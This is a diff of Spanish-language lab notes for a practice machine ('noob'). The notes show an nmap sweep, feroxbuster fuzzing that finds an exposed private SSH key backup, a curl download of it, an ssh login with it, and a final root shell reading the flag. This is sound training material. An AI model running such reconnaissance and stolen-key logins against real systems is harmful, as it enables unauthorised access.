@@ -2,6 +2,8 @@ Parte de [[Maquinas]]
 
 Maquina para practicar ataques con contraseñas
 
+Arpsweep:
+
 ``` bash
 sudo nmap -sn 192.168.56.100/24 -oN arpsweep.txt
 
@@ -78,8 +80,8 @@ Nmap done: 1 IP address (1 host up) scanned in 8.77 seconds
 Enumeramos HTTP mediante un fuzzing basico:
 
 ``` bash
-❯ feroxbuster --url http://192.168.56.109 -x html -x pdf -x txt -x bak -x git
-                                                                                                     
+feroxbuster --url http://192.168.56.109 -x html -x pdf -x txt -x bak -x git
+
  ___  ___  __   __     __      __         __   ___
 |__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
 |    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
@@ -128,8 +130,8 @@ Diego
 Haciendo fuzzing podemos encontrar un archivo oculto:
 
 ``` bash
-❯ feroxbuster --url http://192.168.56.109 -w id_rsa.txt -x bak -x git -x zip -x pub -x tmp -x swap -x temp -x swp
-                                                                                                     
+feroxbuster --url http://192.168.56.109 -w id_rsa.txt -x bak -x git -x zip -x pub -x tmp -x swap -x temp -x swp
+
  ___  ___  __   __     __      __         __   ___
 |__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
 |    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
@@ -200,7 +202,8 @@ l5Ziei4zwDkhZTWB+iZtaJ7aSUJ6CKJb5sTta7HqSSgutGAX80Ao3g==
 Lo obtenemos:
 
 ``` bash
-❯ curl http://192.168.56.109/id_rsa.swp > id_rsa
+curl http://192.168.56.109/id_rsa.swp > id_rsa
+
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
 100  1743  100  1743    0     0   187k      0 --:--:-- --:--:-- --:--:--  212k
@@ -209,9 +212,10 @@ Lo obtenemos:
 Intentamos iniciar sesion:
 
 ``` bash
-❯ chmod 700 id_rsa
-                                                                                                     
-❯ ssh -i id_rsa diego@192.168.56.109
+chmod 700 id_rsa
+
+ssh -i id_rsa diego@192.168.56.109
+
 Enter passphrase for key 'id_rsa': 
 ```
 
@@ -330,3 +334,4 @@ Y  podemos iniciar sesion como root.
 root@noob:~# cat root.txt 
 5d12e0bbb9e9b426ec9e945d440d8288
 ```
+
